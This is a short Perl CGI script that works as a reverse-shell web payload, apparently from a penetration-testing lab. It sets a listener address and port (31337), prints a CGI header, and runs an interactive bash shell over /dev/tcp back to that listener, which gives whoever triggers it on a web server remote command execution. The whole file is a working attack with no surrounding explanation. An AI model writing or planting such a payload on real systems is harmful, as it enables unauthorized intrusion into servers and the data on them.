#!/usr/bin/perl
use strict;

# To change 
$lport = "31337";
$lhost = "10.11.0.1";

# Executed
print "Content-type: text/html\n\n";
system("bash -i >& /dev/tcp/" . $lhost . "/" . $lport . " 0>&1");
